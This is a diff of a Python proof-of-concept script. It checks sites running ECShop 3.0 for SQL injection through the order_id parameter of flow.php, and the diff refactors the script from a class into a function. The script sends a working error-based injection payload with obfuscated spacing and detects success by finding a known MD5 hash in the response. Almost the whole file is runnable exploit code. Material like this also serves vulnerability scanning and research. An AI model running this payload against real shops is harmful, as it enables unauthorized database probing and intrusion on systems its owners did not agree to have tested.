@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-
-
-
-class flow_orderid_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['ecshop3.0 flow.php 参数order_id注入', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -26,7 +19,7 @@ class flow_orderid_sqli:
         post_data = {
             "order_id":"1/**/Or/**/UpdateXml(1,ConCat(0x7e,(Md5(1234))),0)/**/Or/**/11#"
         }
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
@@ -41,5 +34,5 @@ class flow_orderid_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = flow_orderid_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
